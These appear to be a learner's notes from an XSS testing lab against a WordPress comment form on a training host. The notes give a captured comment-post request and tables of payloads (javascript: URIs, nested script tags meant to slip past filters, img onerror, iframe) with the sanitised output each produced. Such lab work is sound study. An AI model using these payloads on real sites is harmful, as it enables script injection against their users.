- Payload that have been tried with responses
- for `name` and `comment` it seems that everything is properly encoded, I mean `<` 
# Request with wich I was manipulating
```
POST /wp-comments-post.php HTTP/1.1
Host: ir.inlanefreight.local
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://ir.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://ir.inlanefreight.local/2022/05/30/hello-world/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: comment_author_email_8b892b78a9fa44a793af3f8fdfcba866=test%40gmail.com; comment_author_8b892b78a9fa44a793af3f8fdfcba866=javascript%3Aalert%281%29
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

comment=fvvvff&author=xxx&email=test%40gmail.com&url=:&wp-comment-cookies-consent=yes&submit=Post+Comment&comment_post_ID=1&comment_parent=0ss0
```

# Url
```
"%<t>22						"http://%22"
"'`						"http://'"
jav<t>ascript:alert(1)				nothing
http://jav<t>ascript:alert(1)			"http://javascript:alert(1)"
http://javascript:alert(1)			"http://javascript:alert(1)"
javascript:alert(1)				nothing
:alert(1)					nothing
j<remove>avascr<remove>ipt			"http://javascript"
j<remove>avascr<remove>ipt:alert(1)		nothing
j<remove>avascr<removeipt:a<test>lert(1)	nothing
javascript%3Aalert(1)				nothing
javascript%3<r>Aalert(1)			"http://javascript%3Aalert(1)"
:						nothing
```
# Name
```
><a<b><<c>>d'e"f%22g%<removed>22		>
t<scri<script>pt>alert(1)</scrip</script>t>	talert(1)
t<scri<script>pt>alert(1)</scrip</script>t>g	talert(1)g
"test"						"test"
"%<t>22						"
test%<t>3Cgg%<t>3E				testgg
&apos;-alert(1)-&apos;				&apos;-alert(1)-&apos;
t<img src=x onerror=alert(1) />			t

&lt;script&gt;alert('XSS')&lt;/script&gt;	<script>alert('XSS')</script> -> HTML encoded &lt;script&gt;alert('XSS')&lt;/script&gt;

t<<<f>x						t
t<<<f>>>x					tx
t><t						t>
```
# Comment
```
t<script>alert(1)</script>			talert(1)
t<<script>>alert(1)<</script>>			t<>alert(1)<>
t<s<script>s>alert(1)<s</script>s>		t<ss>alert(1)<ss>	
t<scri<script>pt>alert(1)<scrip</script>t>	t<script>alert(1)<script>
t<scri<script>pt>alert(1)</scrip</script>t>	t<script>alert(1)</script>
t<iframe SRC="javascript:alert('XSS');" <	t
```
```